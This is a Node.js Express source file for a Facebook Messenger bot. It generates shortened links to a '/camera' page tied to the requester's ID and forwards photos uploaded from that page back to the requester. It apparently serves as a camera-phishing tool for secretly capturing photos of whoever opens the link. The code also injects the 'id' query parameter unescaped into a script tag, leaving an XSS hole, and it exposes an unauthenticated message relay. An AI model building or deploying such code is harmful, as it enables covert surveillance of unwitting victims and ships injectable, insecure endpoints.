require('dotenv').config();
const express = require('express');
const multer = require('multer');
const axios = require('axios');
const fs = require('fs');
const path = require('path');

const app = express();

const PAGE_ACCESS_TOKEN = process.env.token;
const VERIFY_TOKEN = 'veme';
const PORT = 8080;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use('/uploads', express.static('uploads'));
app.use(express.static('public'));

// Multer setup for uploads
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    const dir = './uploads';
    if (!fs.existsSync(dir)) fs.mkdirSync(dir);
    cb(null, dir);
  },
  filename: (req, file, cb) => {
    cb(null, Date.now() + '-' + file.originalname);
  }
});
const upload = multer({ storage });

// Serve camera page dynamically with injected PSID
app.get('/camera', (req, res) => {
  const id = req.query.id || '';
  const filePath = path.join(__dirname, 'public/camera.html');
  fs.readFile(filePath, 'utf8', (err, html) => {
    if (err) return res.status(500).send('Error loading page');
    const injected = html.replace('<!--__INJECT_ID__-->', `<script>const PSID = "${id}";</script>`);
    res.send(injected);
  });
});

// Webhook verification endpoint
app.get('/webhook', (req, res) => {
  const mode = req.query['hub.mode'];
  const token = req.query['hub.verify_token'];
  const challenge = req.query['hub.challenge'];

  if (mode && token === VERIFY_TOKEN) {
    return res.status(200).send(challenge);
  }
  res.sendStatus(403);
});

// Function to send message to Facebook user
async function sendMessage(recipientId, messageData) {
  await axios.post(
    `https://graph.facebook.com/v19.0/me/messages?access_token=${PAGE_ACCESS_TOKEN}`,
    {
      recipient: { id: recipientId },
      message: messageData
    }
  );
}

// Function to shorten URL using TinyURL public API (no API key)
async function shortenUrl(longUrl) {
  try {
    const res = await axios.get(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(longUrl)}`);
    return res.data;
  } catch (err) {
    console.error('TinyURL error:', err.message);
    return longUrl; // fallback to original URL
  }
}

// Handle incoming messages from Facebook webhook
app.post('/webhook', async (req, res) => {
  const body = req.body;

  if (body.object === 'page') {
    for (const entry of body.entry) {
      for (const event of entry.messaging) {
        const senderId = event.sender.id;

        // Skip echoes and non-text messages
        if (!event.message || event.message.is_echo) continue;

        const messageText = event.message.text?.toLowerCase();

        if (messageText === '/generate') {
          const longUrl = `${req.protocol}://${req.get('host')}/camera?id=${senderId}`;
          const shortUrl = await shortenUrl(longUrl);

          // Send quick reply with Open Camera
          await sendMessage(senderId, {
            text: "[By Somby Ny Aina] Copy this link:"
          });

          await sendMessage(senderId, { text: shortUrl });
        } else {
          await sendMessage(senderId, {
            text: "Nein. I don't understand.",
            quick_replies: [
              {
                content_type: "text",
                title: "/generate",
                payload: "GENERATE"
              }
            ]
          });
        }
      }
    }
    res.sendStatus(200);
  } else {
    res.sendStatus(404);
  }
});

// /convert endpoint to receive uploaded photo and message from frontend
app.post('/convert', upload.single('photo'), async (req, res) => {
  const { id, message } = req.body;

  if (!req.file) return res.status(400).json({ error: 'No photo uploaded' });

  const imageUrl = `${req.protocol}://${req.get('host')}/uploads/${req.file.filename}`;
  res.json({ id, message, imageUrl });

  // Auto-send to Messenger if id and message present
  if (id && message) {
    try {
      await axios.post(`${req.protocol}://${req.get('host')}/send`, {
        id,
        text: message,
        imageUrl
      });
    } catch (err) {
      console.error('Failed to auto-send to Messenger:', err.response?.data || err.message);
    }
  }
});

// /send endpoint to send message and optional image to Facebook user
app.post('/send', async (req, res) => {
  const { id, text, imageUrl } = req.body;
  if (!id || !text) return res.status(400).json({ error: 'Missing id or text' });

  try {
    if (imageUrl) {
      await sendMessage(id, {
        attachment: {
          type: "image",
          payload: { url: imageUrl, is_reusable: true }
        }
      });
    }
    await sendMessage(id, { text });
    res.json({ success: true });
  } catch (err) {
    console.error('Failed to send message:', err.response?.data || err.message);
    res.status(500).json({ error: 'Failed to send message' });
  }
});

app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});